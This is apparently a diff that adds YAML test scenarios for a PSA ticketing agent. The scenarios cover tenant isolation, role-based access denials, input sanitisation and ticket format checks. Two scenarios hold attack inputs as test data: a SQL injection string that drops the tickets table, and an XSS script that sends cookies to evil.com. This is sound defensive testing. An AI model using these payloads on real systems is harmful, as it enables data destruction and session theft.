@@ -1,0 +1,258 @@
+# @cavaridge/agent-test — PSA-Lite Seed Scenarios
+# Tests cross-tenant ticket leakage, RBAC enforcement on ticket operations,
+# and functional correctness of PSA ticket handling.
+
+battery: psa-lite
+agentId: psa-lite
+
+scenarios:
+  # ── Tenant Isolation Tests ───────────────────────────────────────
+
+  - id: psa-tenant-001
+    name: Cross-tenant ticket access blocked
+    description: MSP Tech from one MSP cannot access tickets belonging to another MSP's client
+    category: tenant_isolation
+    persona:
+      role: msp_tech
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_cross_tenant_attacker
+    input:
+      action: "get_ticket"
+      ticketId: "TKT-00042"
+      targetTenantId: tenant_dit_msp
+    assertions:
+      - type: not_contains
+        field: result
+        value: "TKT-00042"
+        description: Must not return ticket data from another tenant
+      - type: not_contains
+        field: result
+        value: "tenant_dit_msp"
+        description: Must not leak target tenant identifier
+    expectedOutcome: pass
+    tags: [tenant_isolation, critical]
+
+  - id: psa-tenant-002
+    name: Cross-tenant ticket listing blocked
+    description: Client Admin cannot list tickets from a sibling client under the same MSP
+    category: tenant_isolation
+    persona:
+      role: client_admin
+      tenantId: tenant_compass_client
+      tenantType: client
+      userId: test_user_client_admin
+    input:
+      action: "list_tickets"
+      filterTenantId: tenant_other_client
+    assertions:
+      - type: not_contains
+        field: result
+        value: "tenant_other_client"
+        description: Must not return tickets from sibling client
+    expectedOutcome: pass
+    tags: [tenant_isolation, critical]
+
+  - id: psa-tenant-003
+    name: Cross-tenant time entry injection
+    description: Attacker attempts to create a time entry against another tenant's ticket
+    category: tenant_isolation
+    persona:
+      role: msp_tech
+      tenantId: tenant_evil_msp
+      tenantType: msp
+      userId: test_user_cross_tenant_attacker
+    input:
+      action: "create_time_entry"
+      ticketId: "TKT-00042"
+      targetTenantId: tenant_dit_msp
+      hours: 8
+      description: "Injected time entry"
+    assertions:
+      - type: not_contains
+        field: result
+        value: "created"
+        description: Time entry must not be created on foreign tenant ticket
+    expectedOutcome: pass
+    tags: [tenant_isolation, time_entry, critical]
+
+  # ── RBAC Tests ───────────────────────────────────────────────────
+
+  - id: psa-rbac-001
+    name: Client Viewer cannot create tickets
+    description: Read-only client viewer role must be denied ticket creation
+    category: rbac
+    persona:
+      role: client_viewer
+      tenantId: tenant_compass_client
+      tenantType: client
+      userId: test_user_client_viewer
+    input:
+      action: "create_ticket"
+      subject: "New server needed"
+      priority: "medium"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Should return a permission denied error
+      - type: not_contains
+        field: result
+        value: "TKT-"
+        description: No ticket number should be generated
+    expectedOutcome: pass
+    tags: [rbac, ticket_create]
+
+  - id: psa-rbac-002
+    name: Client Viewer cannot close tickets
+    description: Read-only role must not be able to change ticket status to closed
+    category: rbac
+    persona:
+      role: client_viewer
+      tenantId: tenant_compass_client
+      tenantType: client
+      userId: test_user_client_viewer
+    input:
+      action: "update_ticket"
+      ticketId: "TKT-00010"
+      status: "closed"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Should deny the status change
+    expectedOutcome: pass
+    tags: [rbac, ticket_close]
+
+  - id: psa-rbac-003
+    name: Prospect cannot access PSA at all
+    description: Prospect tier has no PSA access — any operation should be denied
+    category: rbac
+    persona:
+      role: prospect
+      tenantId: tenant_compass_client_prospect
+      tenantType: prospect
+      userId: test_user_prospect
+    input:
+      action: "list_tickets"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "access"
+        description: Should deny all PSA access for prospects
+      - type: not_contains
+        field: result
+        value: "TKT-"
+        description: Must not return any ticket data
+    expectedOutcome: pass
+    tags: [rbac, prospect, critical]
+
+  - id: psa-rbac-004
+    name: MSP Tech cannot delete tickets
+    description: MSP Tech has operational access but no delete permission
+    category: rbac
+    persona:
+      role: msp_tech
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_tech
+    input:
+      action: "delete_ticket"
+      ticketId: "TKT-00010"
+    assertions:
+      - type: contains
+        field: result.error
+        value: "permission"
+        description: Delete should be denied for MSP Tech
+    expectedOutcome: pass
+    tags: [rbac, ticket_delete]
+
+  # ── Security Scenarios ───────────────────────────────────────────
+
+  - id: psa-sec-001
+    name: SQL injection via ticket subject
+    description: Attacker attempts SQL injection through the ticket subject field
+    category: security
+    persona:
+      role: msp_tech
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_tech
+    input:
+      action: "create_ticket"
+      subject: "Server down'; DROP TABLE tickets;--"
+      priority: "critical"
+    assertions:
+      - type: not_contains
+        field: result
+        value: "DROP TABLE"
+        description: SQL injection payload must not be executed or reflected
+    expectedOutcome: pass
+    tags: [security, injection, critical]
+
+  - id: psa-sec-002
+    name: XSS via ticket description
+    description: Attacker injects script tags into ticket description
+    category: security
+    persona:
+      role: client_admin
+      tenantId: tenant_compass_client
+      tenantType: client
+      userId: test_user_client_admin
+    input:
+      action: "create_ticket"
+      subject: "Printer issue"
+      description: "<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"
+    assertions:
+      - type: not_contains
+        field: result.ticket.description
+        value: "<script>"
+        description: Script tags must be sanitized
+    expectedOutcome: pass
+    tags: [security, xss]
+
+  # ── Functional Scenarios ─────────────────────────────────────────
+
+  - id: psa-func-001
+    name: Ticket number format validation
+    description: Created tickets must follow TKT-NNNNN format
+    category: functional
+    persona:
+      role: msp_admin
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_admin
+    input:
+      action: "create_ticket"
+      subject: "New workstation setup"
+      priority: "medium"
+      clientTenantId: tenant_compass_client
+    assertions:
+      - type: regex_match
+        field: result.ticket.ticketNumber
+        value: "^TKT-\\d{5}$"
+        description: Ticket number must match TKT-NNNNN format
+    expectedOutcome: pass
+    tags: [functional, format]
+
+  - id: psa-func-002
+    name: SLA timer starts on creation
+    description: New tickets should have an SLA response deadline set
+    category: functional
+    persona:
+      role: msp_tech
+      tenantId: tenant_dit_msp
+      tenantType: msp
+      userId: test_user_msp_tech
+    input:
+      action: "create_ticket"
+      subject: "Email not working"
+      priority: "high"
+      clientTenantId: tenant_compass_client
+    assertions:
+      - type: contains
+        field: result.ticket
+        value: "slaDeadline"
+        description: SLA deadline should be set on ticket creation
+    expectedOutcome: pass
+    tags: [functional, sla]
